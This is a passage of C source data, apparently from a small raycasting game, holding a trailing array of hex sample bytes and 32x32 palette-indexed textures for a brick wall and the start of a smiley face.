0x3D, 0xF8, 0xBB, 0xF9, 0x42, 0xFD, 0x8C, 0xFE, 0x5B, 0x00, 0xFF, 0x02, 0x9F, 0x03, 0xEA, 0x01, 0x1E, 0x00, 0x06, 0x00, 0x44, 0x00, 0x5F, 0x00, 0xA8, 0xFF, 0x14, 0xFE, 0x30, 0xFE, 0x55, 0x00, 0xBB, 0x01, 0xF3, 0x00, 0x8B, 0xFE, 0xE1, 0xFC, 0x12, 0xFE, 0x29, 0x00, 0x71, 0x00, 0xFF, 0xFF, 0xEC, 0x00, 0x6D, 0x01, 0xA1, 0x01, 0x5F, 0x02, 0xDE, 0x01, 0xF8, 0xFE, 0x11, 0xFD, 0xBF, 0xFE, 0x68, 0x00, 0xD4, 0xFF, 0xC2, 0xFF, 0x7D, 0x01, 0x74, 0x02, 0x44, 0x02, 0x81, 0x02, 0x63, 0x02, 0x09, 0x01, 0xDA, 0xFF, 0x5E, 0x00, 0x6B, 0x01, 0xF4, 0x01, 0xBC, 0x01, 0x51, 0x00, 0xF9, 0xFE, 0x02, 0xFF, 0x6C, 0xFF, 0x78, 0xFF, 0xE7, 0xFE, 0x51, 0xFE, 0x2D, 0xFE, 0x1D, 0xFF, 0x33, 0x00, 0x65, 0x00, 0xB8, 0xFF, 0x0D, 0xFF, 0x70, 0xFF, 0x17, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x35, 0x00, 0x4B, 0x00, 0x26, 0x00, 0x20, 0x00, 0x26, 0x00, 0x5B, 0xFF, 0x98, 0xFD, 0xF9, 0xFC, 0xE2, 0xFD, 0x8C, 0xFE, 0x74, 0xFE, 0x1A, 0xFE, 0xDB, 0xFD, 0x1F, 0xFE, 0x7F, 0xFE, 0x45, 0xFE, 0xDE, 0xFD, 0xD9, 0xFD, 0x4A, 0xFE, 0xF1, 0xFE, 0x93, 0xFF, 0xBF, 0xFF, 0xE6, 0xFF, 0x52, 0x00, 0x94, 0x00, 0xC6, 0x00, 0x21, 0x01, 0x8D, 0x01, 0xB0, 0x01, 0x73, 0x01, 0x4B, 0x01, 0x5B, 0x01, 0x7E, 0x01, 0x3C, 0x01, 0xEE, 0x00, 0x2A, 0x01, 0x84, 0x01, 0x49, 0x01, 0xE4, 0x00, 0xDD, 0x00, 0x0C, 0x01, 0x29, 0x01, 0x2C, 0x01, 0xFE, 0x00, 0x88, 0x00, 0x2D, 0x00, 0x06, 0x00, 0x33, 0x00, 0x79, 0x00, 0xA3, 0x00, 0x62, 0x00, 0x37, 0x00, 0x50, 0x00, 0x46, 0x00, 0xFC, 0xFF, 0xAA, 0xFF, 0xDA, 0xFF, 0xED, 0xFF, 0xD2, 0xFF, 0xA3, 0xFF, 0x7A, 0xFF, 0x9D, 0xFF, 0x6C, 0xFF, 0x0F, 0xFF, 0xDB, 0xFE, 0x09, 0xFF, 0x39, 0xFF, 0x43, 0xFF, 0x69, 0xFF, 0x82, 0xFF, 0x68, 0xFF, 0x5F, 0xFF, 0x4E, 0xFF, 0x21, 0xFF, 0x03, 0xFF, 0xFE, 0xFE, 0x3D, 0xFF, 0x69, 0xFF, 0xA0, 0xFF, 0xDC, 0xFF, 0x33, 0x00, 0xC2, 0x00, 0x11, 0x01, 0xAC, 0x01, 0xD9, 0x01, 0x3B, 0x01, 0xD0, 0x00, 0x40, 0x01, 0xC5, 0x01, 0xC4, 0x01, 0xCA, 0x01, 0x8F, 0x01, 0x20, 0x01, 0x10, 0x01, 0x1D, 0x01, 0xE2, 0x00, 0x4E, 0x00, 0xC6, 0xFF, 0x82, 0xFF, 0x7F, 0xFF, 0x57, 0xFF, 0xAF, 0xFE, 0xFC, 0xFD, 0x15, 0xFE, 0xF8, 0xFE, 0x67, 0xFF, 0xFA, 0xFE, 0x85, 0xFE, 0x94, 0xFE, 0xF2, 0xFE, 0x7D, 0xFF, 0xEF, 0xFF, 0x35, 0x00, 0x53, 0x00, 0x68, 0x00, 0x3C, 0x00, 0x2E, 0x00, 0x72, 0x00, 0xA8, 0x00, 0x96, 0x00, 0x1A, 0x00, 0xAB, 0xFF, 0xAF, 0xFF, 0x1D, 0x00, 0x3E, 0x00, 0xE5, 0xFF, 0x17, 0x00, 0x9B, 0x00, 0xE2, 0x00, 0x26, 0x01, 0x66, 0x01, 0x65, 0x01, 0xF4, 0x00, 0xC1, 0x00, 0x30, 0x01, 0x4A, 0x01, 0xD9, 0x00, 0x50, 0x00, 0xA5, 0x00, 0x31, 0x01, 0xF8, 0x00, 0x83, 0x00, 0x1F, 0x00, 0xD1, 0xFF, 0xBC, 0xFF, 0xA5, 0xFF, 0x3D, 0xFF, 0xAC, 0xFE, 0x11, 0xFE, 0xA6, 0xFD, 0x56, 0xFD, 0x78, 0xFD, 0xA2, 0xFD, 0xAB, 0xFD, 0xEA, 0xFD, 0x42, 0xFE, 0xBE, 0xFE, 0xDC, 0xFE, 0x96, 0xFE, 0x7C, 0xFE, 0xC0, 0xFE, 0xEB, 0xFE, 0xC4, 0xFE, 0x9C, 0xFE, 0xE2, 0xFE, 0x25, 0xFF, 0x4B, 0xFF, 0xB3, 0xFF, 0xDD, 0xFF, 0xD7, 0xFF, 0xD6, 0xFF, 0x1D, 0x00, 0x71, 0x00, 0x55, 0x00, 0x17, 0x00, 0xE0, 0xFF, 0xF1, 0xFF, 0x2D, 0x00, 0x22, 0x00, 0xE7, 0xFF, 0xB5, 0xFF, 0xA9, 0xFF, 0xBD, 0xFF, 0xE1, 0xFF, 0x5E, 0x00, 0xAD, 0x00, 0xB7, 0x00, 0xCD, 0x00, 0xC6, 0x00, 0x88, 0x00, 0x7C, 0x00, 0x74, 0x00, 0x4F, 0x00, 0x16, 0x00, 0x9D, 0xFF, 0x29, 0xFF, 0xE8, 0xFE, 0xB5, 0xFE, 0xB0, 0xFE, 0x04, 0xFF, 0x2C, 0xFF, 0x3D, 0xFF, 0x35, 0xFF, 0x1C, 0xFF, 0x02, 0xFF, 0x54, 0xFF, 0xA3, 0xFF, 0xA2, 0xFF, 0xC2, 0xFF, 0xE2, 0xFF, 0x27, 0x00, 0x48, 0x00, 0x22, 0x00, 0x0B, 0x00, 0x26, 0x00, 0x41, 0x00, 0x43, 0x00, 0x0E, 0x00, 0x05, 0x00, 0x45, 0x00, 0x7B, 0x00, 0x9E, 0x00, 0xC7, 0x00, 0xF9, 0x00, 0x0C, 0x01, 0xF9, 0x00, 0xEB, 0x00, 0xEF, 0x00, 0x9F, 0x00, 0x39, 0x00, 0x6C, 0x00, 0x92, 0x00, 0x6A, 0x00, 0x1A, 0x00, 0xC4, 0xFF, 0x67, 0xFF, 0xF3, 0xFE, 0xBC, 0xFE, 0xB6, 0xFE, 0x84, 0xFE, 0x42, 0xFE, 0x17, 0xFE, 0x4A, 0xFE, 0x64, 0xFE, 0x62, 0xFE, 0x97, 0xFE, 0xB5, 0xFE, 0xBF, 0xFE, 0x0C, 0xFF, 0x81, 0xFF, 0xEC, 0xFF, 0xE9, 0xFF, 0xC1, 0xFF, 0xC1, 0xFF, 0xE8, 0xFF, 0x0B, 0x00, 0x3D, 0x00, 0xAD, 0x00, 0xE5, 0x00, 0xE8, 0x00, 0x20, 0x01, 0x65, 0x01, 0x3A, 0x01, 0xFC, 0x00, 0xEE, 0x00, 0xBB, 0x00, 0x54, 0x00, 0x11, 0x00, 0x1A, 0x00, 0x20, 0x00, 0x09, 0x00, 0xCC, 0xFF, 0x77, 0xFF, 0x8B, 0xFF, 0x9C, 0xFF, 0x87, 0xFF, 0x4E, 0xFF, 0x1A, 0xFF, 0x19, 0xFF, 0x31, 0xFF, 0x5E, 0xFF, 0x88, 0xFF, 0xCB, 0xFF, 0xD0, 0xFF, 0x01, 0x00, 0x41, 0x00, 0x2B, 0x00, 0x0D, 0x00, 0x00, 0x00, 0xD3, 0xFF, 0x9D, 0xFF, 0xA8, 0xFF, 0xDB, 0xFF, 0xF0, 0xFF, 0xE3, 0xFF, 0xCB, 0xFF, 0x0E, 0x00, 0x65, 0x00, 0x76, 0x00, 0x79, 0x00, 0x68, 0x00, 0x6A, 0x00, 0x7E, 0x00, 0x4E, 0x00, 0x26, 0x00, 0x1B, 0x00, 0x31, 0x00, 0x3B, 0x00, 0x66, 0x00, 0x36, 0x00, 0xF1, 0xFF, 0xCC, 0xFF, 0x8C, 0xFF, 0x50, 0xFF, 0x19, 0xFF, 0x20, 0xFF, 0x36, 0xFF, 0x16, 0xFF, 0x09, 0xFF, 0xF8, 0xFE, 0xEF, 0xFE, 0xE7, 0xFE, 0xD4, 0xFE, 0xB7, 0xFE, 0xCE, 0xFE, 0xD6, 0xFE, 0xD7, 0xFE, 0xE9, 0xFE, 0x2B, 0xFF, 0x4C, 0xFF, 0x54, 0xFF, 0x65, 0xFF, 0x81, 0xFF, 0xAD, 0xFF, 0x24, 0x00, 0xD6, 0x00, 0x5F, 0x01, 0x6D, 0x01, 0x50, 0x01, 0x33, 0x02, 0x49, 0x03, 0x89, 0x01, 0xDA, 0xFD, 0x6B, 0xFC, 0x2F, 0xFE, 0x8F, 0xFF, 0x62, 0xFF, 0xE9, 0xFE, 0x36, 0xFF, 0x06, 0x00, 0x39, 0x01, 0x5A, 0x02, 0xF4, 0x03, 0x43, 0x06, 0x4A, 0x07, 0x43, 0x06, 0x6C, 0x03, 0xDB, 0x00, 0x56, 0xFF, 0x89, 0xFB, 0xED, 0xF6, 0xB9, 0xF5, 0xE6, 0xF7, 0x9A, 0xFA, 0x1B, 0xFC, 0x22, 0xFD, 0xF1, 0xFD, 0xD9, 0xFF, 0x66, 0x02, 0x99, 0x02, 0xDE, 0x00, 0x6A, 0xFF, 0xAB, 0xFF, 0x9C, 0x00, 0x51, 0x01, 0xC3, 0x01, 0x24, 0x02, 0xB6, 0x01, 0x62, 0x00, 0x33, 0x00, 0xC1, 0x01, 0x3E, 0x04, 0x4A, 0x05, 0x8F, 0x04, 0xFE, 0x02, 0xC6, 0x00, 0xC8, 0xFE, 0x68, 0xFE, 0x3E, 0x00, 0xDF, 0x01, 0x1A, 0x01, 0x1F, 0x00, 0x5D, 0x00, 0x05, 0x01, 0x30, 0x01, 0xA4, 0x00, 0xC9, 0x00, 0xD1, 0x01, 0x01, 0x02, 0x33, 0x00, 0x30, 0xFD, 0x1D, 0xFC, 0xEB, 0xFD, 0xFE, 0xFF, 0x46, 0x00, 0xA9, 0xFF, 0xFC, 0xFF, 0x21, 0x01, 0x3D, 0x02, 0x68, 0x02, 0xD5, 0x01, 0xC4, 0x01, 0x90, 0x02, 0x69, 0x02, 0xD5, 0x00, 0x64, 0xFF, 0x76, 0xFF, 0x81, 0x00, 0x94, 0x01, 0x3B, 0x02, 0x99, 0x02, 0x7E, 0x02, 0x76, 0x01, 0x41, 0x00, 0xA4, 0xFF, 0xD9, 0xFF, 0x12, 0x00, 0xC0, 0xFF, 0x58, 0xFF, 0xDC, 0xFE, 0x33, 0xFE, 0x4E, 0xFD, 0x0D, 0xFD, 0x6D, 0xFD, 0xDC, 0xFD, 0xDD, 0xFD, 0x6C, 0xFD, 0xCD, 0xFC, 0x30, 0xFC, 0x13, 0xFC, 0xB7, 0xFC, 0x44, 0xFD, 0x2B, 0xFD, 0x35, 0xFD, 0xA9, 0xFD, 0x04, 0xFE, 0x13, 0xFE, 0x63, 0xFE, 0xA9, 0xFE, 0xEA, 0xFE, 0x8F, 0xFF, 0xC1, 0xFF, 0x13, 0xFF, 0xFD, 0xFD, 0x15, 0xFE, 0x6B, 0xFF, 0xB6, 0x00, 0x69, 0x01, 0xA3, 0x01, 0xB4, 0x01, 0x6D, 0x01, 0x27, 0x01, 0x4A, 0x01, 0x80, 0x01, 0x70, 0x01, 0xC0, 0x00, 0x12, 0x00, 0x0F, 0x00, 0xDD, 0xFF, 0xA0, 0xFF, 0xBB, 0xFF, 0xEC, 0xFF, 0x08, 0x00, 0xFE, 0xFF, 0x20, 0x00, 0x3F, 0x00, 0x52, 0x00, 0x56, 0x00, 0x56, 0x00, 0xB1, 0x00, 0x59, 0x01, 0xB5, 0x01, 0xAF, 0x01, 0x94, 0x01, 0x6B, 0x01, 0x1E, 0x01, 0x06, 0x01, 0x17, 0x01, 0x2A, 0x01, 0xC5, 0x00, 0x26, 0x00, 0xE3, 0xFF, 0x07, 0x00, 0x15, 0x00, 0xD9, 0xFF, 0x66, 0xFF, 0x06, 0xFF, 0xF2, 0xFE, 0x24, 0xFF, 0x03, 0xFF, 0xFF, 0xFE, 0x01, 0xFF, 0xD5, 0xFE, 0x9E, 0xFE, 0x7F, 0xFE, 0x6F, 0xFE, 0x7C, 0xFE, 0xC2, 0xFE, 0x17, 0xFF, 0x91, 0xFF, 0xF7, 0xFF, 0x44, 0x00, 0x88, 0x00, 0xD9, 0x00, 0x79, 0x01, 0x19, 0x02, 0x71, 0x02, 0xAF, 0x02, 0xE3, 0x02, 0x00, 0x03, 0x2E, 0x03, 0x8A, 0x03, 0xA4, 0x03, 0x58, 0x03, 0xA7, 0x02, 0x0C, 0x02, 0xA5, 0x01, 0x5F, 0x01, 0xBB, 0x00, 0xF1, 0xFF, 0x27, 0xFF, 0x96, 0xFE, 0x44, 0xFE, 0xE9, 0xFD, 0xB2, 0xFD, 0x97, 0xFD, 0x7E, 0xFD, 0x5F, 0xFD, 0x4E, 0xFD, 0x52, 0xFD, 0x58, 0xFD, 0x84, 0xFD, 0xD3, 0xFD, 0x25, 0xFE, 0x6B, 0xFE, 0xC4, 0xFE, 0x2B, 0xFF, 0xA5, 0xFF, 0x06, 0x00, 0x40, 0x00, 0x70, 0x00, 0xB8, 0x00, 0x00, 0x01, 0x58, 0x01, 0x9F, 0x01, 0xAB, 0x01, 0xDA, 0x01, 0x22, 0x02, 0x91, 0x01, 0x8C, 0x00, 0xA1, 0x00, 0x78, 0x01, 0xCB, 0x01, 0x7B, 0x01, 0x49, 0x01, 0x34, 0x01, 0xED, 0x00, 0x87, 0x00, 0x5A, 0x00, 0x5E, 0x00, 0x37, 0x00, 0x1F, 0x00, 0xD4, 0xFF, 0x6B, 0xFF, 0x4A, 0xFF, 0x3C, 0xFF, 0x31, 0xFF, 0x21, 0xFF, 0x5B, 0xFF, 0x5E, 0xFF, 0xFB, 0xFE, 0x86, 0xFE, 0xBE, 0xFE, 0xCB, 0xFF, 0xD5, 0x00, 0x72, 0x01, 0x6A, 0x01, 0x31, 0x01, 0x04, 0x01, 0x04, 0x01, 0x17, 0x01, 0x33, 0x01, 0x35, 0x01, 0x30, 0x01, 0x27, 0x01, 0xEA, 0x00, 0x97, 0x00, 0x78, 0x00, 0x2C, 0x00, 0xFC, 0xFF, 0x40, 0x00, 0xC2, 0x00, 0x1D, 0x01, 0x6D, 0x01, 0xBF, 0x01, 0xEE, 0x01, 0xC1, 0x01, 0x93, 0x01, 0x91, 0x01, 0xC5, 0x01, 0xA4, 0x01, 0xE5, 0x00, 0x6D, 0x00, 0x47, 0x00, 0x28, 0x00, 0xDF, 0xFF, 0xAF, 0xFF, 0x7E, 0xFF, 0x75, 0xFF, 0x76, 0xFF, 0xFF, 0xFE, 0x90, 0xFE, 0x47, 0xFE, 0x30, 0xFE, 0x84, 0xFE, 0xD6, 0xFE, 0x81, 0xFE, 0xF1, 0xFD, 0xE2, 0xFD, 0x72, 0xFE, 0x37, 0xFF, 0x87, 0xFF, 0x67, 0xFF, 0x18, 0xFF, 0xF5, 0xFE, 0xE3, 0xFE, 0xF3, 0xFE, 0x16, 0xFF, 0x3C, 0xFF, 0x48, 0xFF, 0x07, 0xFF, 0xC7, 0xFE, 0xA2, 0xFE, 0x8A, 0xFE, 0x64, 0xFE, 0x3E, 0xFE, 0x44, 0xFE, 0x87, 0xFE, 0xE2, 0xFE, 0xF1, 0xFE, 0xF3, 0xFE, 0x50, 0xFF, 0xE6, 0xFF, 0x24, 0x00, 0x1A, 0x00, 0xFD, 0xFF, 0x8E, 0xFF, 0x2D, 0xFF, 0x60, 0xFF, 0x86, 0xFF, 0x68, 0xFF, 0x40, 0xFF, 0x34, 0xFF, 0x41, 0xFF, 0x74, 0xFF, 0xCB, 0xFF, 0xE3, 0xFF, 0x16, 0x00, 0xBF, 0x00, 0x52, 0x01, 0x5C, 0x01, 0x2A, 0x01, 0x5A, 0x01, 0xC2, 0x01, 0x1C, 0x02, 0x4D, 0x02, 0x2E, 0x02, 0xC5, 0x01, 0x48, 0x01, 0x21, 0x01, 0x3E, 0x01, 0x68, 0x01, 0x51, 0x01, 0x29, 0x01, 0x00, 0x01, 0x8D, 0x00, 0x53, 0x00, 0x17, 0x00, 0xD3, 0xFF, 0x72, 0xFF, 0x43, 0xFF, 0x23, 0xFF, 0xCC, 0xFE, 0x73, 0xFE, 0x5D, 0xFE, 0x51, 0xFE, 0x01, 0xFE, 0x9F, 0xFD, 0x97, 0xFD, 0xF3, 0xFD, 0x2F, 0xFE};





#define TEX_SIZE RAYCAST_TEX_SIZE
Color8 textures[8][8 + TEX_SIZE*TEX_SIZE] = {
  // Mario-style brick wall
  { 32, 32, 0x0E, 0,0,0,0,0, // 1032 Bytes
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
    0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x0E, 0x00, 0x00,
  },
  // Smiley face
  { 32, 32, 0x00, 0,0,0,0,0, // 1032 Bytes
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
